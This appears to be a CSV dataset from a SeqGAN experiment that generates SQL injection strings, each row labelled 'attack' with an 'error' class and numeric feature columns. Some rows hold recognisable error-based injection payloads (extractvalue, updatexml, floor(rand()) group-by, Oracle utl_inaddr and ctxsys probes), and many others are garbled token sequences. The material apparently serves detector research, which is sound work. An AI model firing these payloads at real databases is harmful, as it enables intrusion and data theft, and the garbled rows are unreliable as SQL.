attack,"1%floor""  *2,  )   then and s       )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296,40.0,20.0,3.295461844238322,13.0,2.0,18.0,7.0,0.325,0.05,0.45,0.175,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"11""_natualasauncoyerog_zy  eroadettys..r  (  =  ,floorh  rand  113 0,1   ax else  113  )   x by FROM D end  ) 4493)   then by by by 1 ANDAND 1x  x   select concat  (  =  ||chr  (  *)   )   where chr  112  ||chocp.gsxr_amaop  ycconcat  (  (      chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297,253.0,44.0,4.2473206122872025,124.0,19.0,83.0,27.0,0.4901185770750988,0.07509881422924901,0.32806324110671936,0.1067193675889328,0.0,1.0,0.0,0.0,1.0,2.0,0.0,11.0,0.0,3.0,2.0,7.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1 etyssgsxet_o,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298,14.0,10.0,3.1820058147602133,11.0,1.0,1.0,1.0,0.7857142857142857,0.07142857142857142,0.07142857142857142,0.07142857142857142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'turt_tyxu"" like ""ljm   4493'  =  'chryv.ws a 5584 1 end  )   )    )    )   then D AINCMSTRAS 1 by DT where from 0x5c  =  6055 or by DI.UM  0 SELECT by 1 D else m whenIhr  (  *  ||  113  casec  (  edl.  (  =  =      (  )   then1 1392 s  select by,1 8382  )     )  =  *2   )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299,451.0,55.0,4.115393409234995,145.0,67.0,185.0,54.0,0.3215077605321508,0.14855875831485588,0.41019955654101997,0.1197339246119734,4.0,2.0,0.0,0.0,2.0,6.0,0.0,28.0,0.0,1.0,6.0,10.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-3775case 7881 ||  (  (   6237  ||chr  (  113  0  randhr  case 1 end  a else from   (  select when where 3074  1297,  (  4232  )  || end  =  ,  )   )     )     concat  select 8488 AA )||chr  (  adt_ar.r  (  )   fromI  )    (  )     SELECT r.chr  (  =  )   or    SELECT or or  end  (  select DASNT IS_r  =  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300,310.0,42.0,3.94305231101493,114.0,33.0,125.0,38.0,0.36774193548387096,0.1064516129032258,0.4032258064516129,0.12258064516129032,0.0,0.0,1.0,0.0,0.0,3.0,0.0,20.0,0.0,2.0,2.0,12.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,5.0,0.0,1.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1""  )   )  || end   or extractvalue  select I. select 1x  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301,60.0,21.0,3.6756925587058804,31.0,2.0,19.0,8.0,0.5166666666666667,0.03333333333333333,0.31666666666666665,0.13333333333333333,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-6237c5305xtlinadq    )    x m 0yg AS endn information_schema.v  )  ||,  =  select T7562  *2   )    )     )   )     then # 7881  (  )   )   (  )    )   x x        )    )   x   :from end  ,  ||chr  (  hr  =  =     c me 5584 1 4493  =.achroaer  (  =  6237,1    select DISCn_s 7158  =  4232  )   3785 x",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302,299.0,47.0,3.9082255143446725,87.0,44.0,130.0,38.0,0.2909698996655518,0.14715719063545152,0.43478260869565216,0.12709030100334448,0.0,0.0,1.0,0.0,1.0,6.0,0.0,17.0,0.0,2.0,3.0,12.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '9891(  ,floor  rand  =  case by  ,,7469  ||chr  (  =  case 0 ||  (  case when 4386  case||chr  ||chount_adhhrx.echr  (    or (    s   xfr  _2 AND fromu,concat  )     ),     )  )   )   )   WHERE 1     select end    )   )     )  )   (  (  4510eau'  (  (  (  )   || 5856  ||chr  (  )  6270   or  by",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303,465.0,45.0,3.866253818771907,134.0,66.0,196.0,69.0,0.28817204301075267,0.14193548387096774,0.421505376344086,0.14838709677419354,3.0,0.0,0.0,0.0,0.0,3.0,0.0,37.0,0.0,2.0,11.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'Yn122ax3074",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304,190.0,29.0,3.48975318621491,43.0,42.0,81.0,24.0,0.22631578947368422,0.22105263157894736,0.4263157894736842,0.12631578947368421,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1jIqf,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305,5.0,5.0,2.321928094887362,4.0,1.0,0.0,0.0,0.8,0.2,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  ""l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306,10.0,6.0,2.321928094887362,1.0,1.0,4.0,4.0,0.1,0.1,0.4,0.4,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%concat'||  (  select '.s   )     or RE  ||chr  =  ,  ||(  =  select AND WHERE union dchr  113  113  ,concat  )  *   xxuamn   )    )     9067)  un||ICtr.ger  (  ||chr   concat  6082  (  >  (  0  case when   (  select select   then 1 R 3785 when   x ,concat  6055  113  ||selectnx.chhr  (  4232  0  *2.)  # when   x.(  )  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307,325.0,48.0,4.122263049755974,127.0,34.0,118.0,46.0,0.39076923076923076,0.10461538461538461,0.3630769230769231,0.14153846153846153,2.0,0.0,0.0,0.0,2.0,2.0,0.0,15.0,1.0,0.0,3.0,19.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1NyuBnatoereras.gdbt_et when  =  select  m   )    ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308,63.0,30.0,4.276053385567636,34.0,10.0,14.0,5.0,0.5396825396825397,0.15873015873015872,0.2222222222222222,0.07936507936507936,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'  a_)    or 1 E   )    --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309,27.0,10.0,2.3621705046031805,4.0,2.0,15.0,6.0,0.14814814814814814,0.07407407407407407,0.5555555555555556,0.2222222222222222,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1t%y.113  (  ,concat  SELECT I 1210  =  ,concat  4232  u   ,  ||chThr  (  6237,floor  selectI  =  )   then 3051 1 when   (    )   and   --ruadr.(  ,   (  ||  (  >  select fromhr  (  =  = 6913 RNUkIT end  )   then else select end  ||schr  (hr  (  0  ||  (  ||r  (  (  select or  D union 1   then x DISM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310,301.0,49.0,4.126978154432238,123.0,27.0,111.0,40.0,0.40863787375415284,0.08970099667774087,0.3687707641196013,0.132890365448505,0.0,0.0,2.0,0.0,0.0,4.0,0.0,15.0,1.0,0.0,5.0,17.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%a' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'nllnzn   )        4510,  (  )  ||chr  (  ,  =  )    )    *    (  (  ,floor  )   or ,concat  113  *,ix  )     and    FROM union 1 1x 7881 FROM xM u or (  t113  )  )    select  union Du)        )u(  ,  || dr  (  0 fromAND)      xu   x  =  0  a   )    )    )  ||chr  112  )     )   then union ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311,1150.0,52.0,3.9051308232800275,387.0,144.0,475.0,144.0,0.33652173913043476,0.12521739130434784,0.41304347826086957,0.12521739130434784,4.0,2.0,0.0,0.0,8.0,5.0,0.0,87.0,3.0,4.0,22.0,20.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,13.0,6.0,0.0,7.0,5.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,41.0
attack,"1""  =  ""ay",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312,10.0,6.0,2.321928094887362,2.0,1.0,4.0,3.0,0.2,0.1,0.4,0.3,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%<' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313,181.0,33.0,3.9322819627490775,46.0,47.0,63.0,25.0,0.2541436464088398,0.2596685082872928,0.34806629834254144,0.13812154696132597,2.0,0.0,0.0,0.0,0.0,2.0,0.0,11.0,1.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""3775xveynaladtyslyzwodu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'' like '"" like ""su",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314,544.0,40.0,3.950853676406177,151.0,99.0,209.0,85.0,0.2775735294117647,0.18198529411764705,0.38419117647058826,0.15625,4.0,4.0,0.0,0.0,0.0,4.0,0.0,41.0,1.0,0.0,7.0,26.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""0x717a767a71neuar",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315,19.0,11.0,3.1363793303507563,8.0,10.0,0.0,1.0,0.42105263157894735,0.5263157894736842,0.0,0.05263157894736842,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'Atxyusww",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316,187.0,29.0,3.495390903448332,47.0,35.0,81.0,24.0,0.25133689839572193,0.18716577540106952,0.43315508021390375,0.12834224598930483,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1x' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'f5305' like 'f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317,312.0,38.0,4.047018228779474,108.0,59.0,111.0,34.0,0.34615384615384615,0.1891025641025641,0.3557692307692308,0.10897435897435898,4.0,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1% ' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'o'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318,269.0,36.0,3.976148416514086,101.0,35.0,98.0,35.0,0.3754646840148699,0.13011152416356878,0.3643122676579926,0.13011152416356878,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.0,1.0,2.0,5.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,-5967 1 d  : x   group 3931 end  caseOt_as.Nserasselect   (  Rasss Iwr.Um 1x 1 by select information_schemax. INCkkNAWconcatNThrhrhrhearrr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319,138.0,43.0,4.717214997446816,95.0,11.0,24.0,8.0,0.6884057971014492,0.07971014492753623,0.17391304347826086,0.057971014492753624,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' 5584 e I else when   where 9173 * || concat  )  select when unionun else chr  (  ||ounuin   or extractvalue    4232  caseANDayxl_t  (  (  0x7171706a71  )  )     )   a 7158  )     or or 4493  #u   =  7469  =  )     )  )     0x717a767a71,1 concat  4232  4232  4232  )   from _ or D end  )     WHERE by 3785 7158  (i,floor  rand  113  chr  (  case   u2   ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320,358.0,48.0,4.187313567952642,130.0,69.0,129.0,30.0,0.36312849162011174,0.19273743016759776,0.36033519553072624,0.08379888268156424,1.0,0.0,0.0,0.0,1.0,2.0,0.0,15.0,0.0,2.0,2.0,9.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,2.0,1.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   """"  =  ""       x. 5192 group by end  )   then group 0 concat  (  4232  case 1210  from x end  )   then 1 0 end  ,0x717a767a71,floor    case when   (  (  =  5023  )  ||chr  (   SELECT concat  113  6825   )    )     )     )   SELECT by   )    )   )    6082  ,0x717a767a71,floor  rand  ||chrhr  =u  4232  ,     ,  )  ,1   from 1210  )    (  1045   '+  (  select ' then m)   )     ,6 dr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321,553.0,46.0,3.8816801176526274,159.0,97.0,234.0,63.0,0.2875226039783002,0.17540687160940324,0.4231464737793852,0.11392405063291139,2.0,4.0,0.0,0.0,0.0,4.0,0.0,34.0,0.0,0.0,13.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '  ,  chr  (  =  )   FROM endin*2   )   from select else union or or 6913er  case  (  case R unionE  ||chr  (  =  )          concat  ||chr  (  ,floor  1045  =  0,0x717a767a71,  )     1  ,7562  ,0x717a767a71,floor    ||chr  select union or 1 from )  113     *,0x717a767a71,  select FROM FROM  ama   (  )     E1 anda concat   chG  =  d   a WHERE union union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322,682.0,46.0,4.016757663427691,243.0,91.0,260.0,88.0,0.3563049853372434,0.13343108504398826,0.3812316715542522,0.12903225806451613,2.0,0.0,0.0,0.0,2.0,6.0,0.0,39.0,0.0,3.0,9.0,34.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,4.0,1.0,6.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,22.0
attack,1'||  (  select 'q' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'easlau,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,323,352.0,33.0,3.6633302543365653,105.0,45.0,141.0,61.0,0.29829545454545453,0.1278409090909091,0.4005681818181818,0.17329545454545456,4.0,0.0,0.0,0.0,0.0,2.0,0.0,29.0,0.0,3.0,0.0,24.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,1'||  (  select 'y(ua'  =  '_'  =  't,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,324,37.0,15.0,3.219845491570541,10.0,1.0,13.0,13.0,0.2702702702702703,0.02702702702702703,0.35135135135135137,0.35135135135135137,6.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,1.0,0.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'||  (  select 'xyu_""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  "".geerauasass 9173   x  )  ,concat  (  (  ||r  castselect when   (  case chrNr  (  (  0   RM when  --  ||cxss.rs or 1 end 6913  )  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,325,444.0,43.0,3.9611818692290663,168.0,45.0,171.0,60.0,0.3783783783783784,0.10135135135135136,0.38513513513513514,0.13513513513513514,2.0,2.0,2.0,0.0,3.0,1.0,0.0,32.0,0.0,3.0,6.0,12.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"1'||  (  select '  uahrNU  )  ,  select  )   then 0 or chr  select chhr  (  4493  ||chr  ( 3931 8488 DIIT elseYdrWo_r   gT  a   (  ,0x717a767a71)   (  ||r  (  ||r  (  ,  113  benchmark  case|| LISSr.USOIUMM end  )  )   ,r  (  (  6055tr   and else by  by * end   then AND whereelse|| DNSIwhereIN. 